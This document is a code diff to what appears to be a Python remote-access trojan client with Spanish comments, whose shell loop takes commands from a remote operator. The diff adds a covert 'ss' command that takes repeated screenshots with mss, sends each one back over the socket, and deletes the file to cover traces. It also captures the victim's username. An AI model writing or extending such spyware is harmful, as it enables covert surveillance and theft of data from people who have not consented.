@@ -8,6 +8,7 @@ import struct
 import requests
 import cv2
 import platform
+import mss
 from time import sleep
 from subprocess import Popen, PIPE
 from zipfile import ZipFile
@@ -27,6 +28,7 @@ class TCP:
         # chunk --> 4MB para enviar informacion
         self.__chunk = 4194304
         self.__myOs = platform.system().lower()
+        self.__userName = getpass.getuser()
 
     def conectar(self):
         # Se inicia el ciclo para crear la conexion
@@ -849,6 +851,36 @@ class TCP:
                     self.enviarDatos(info[i:i+self.__chunk].encode())
                     i += self.__chunk
 
+    def screenShot(self, cmd):
+        params = self.parametros(cmd, r"(\s-[dnot]+[= ])")[0]
+        if '-d' in params.keys():
+            directorio = params['-d']
+        else:
+            directorio = '.'
+
+        n = 1
+        t = 0
+        if '-n' in params.keys():
+            n = int(params['-n'])
+        if '-t' in params.keys():
+            t = int(params['-t'])
+
+        screen = mss.mss()
+        i = 0
+        while i < n:
+            ubicacion = f"{directorio}/ss{i}.png"
+            screen.shot(output=ubicacion)
+            self.__sock.send(b'ok')
+            self.enviarArchivo(ubicacion)
+
+            if self.__myOs == "windows":
+                os.system(f"del {ubicacion}")
+            if self.__myOs == "linux":
+                os.system(f"rm {ubicacion}")
+
+            sleep(t)
+            i += 1
+
     # Funcion para recibir y evaluar comandos
     def shell(self):
         try:
@@ -1025,6 +1057,13 @@ class TCP:
                         # 'self.save'
                         cmd = cmd[5:]
                         self.save(cmd)
+
+                    except:
+                        continue
+
+                elif cmd.lower()[:2] == "ss":
+                    try:
+                        self.screenShot(cmd)
 
                     except:
                         continue
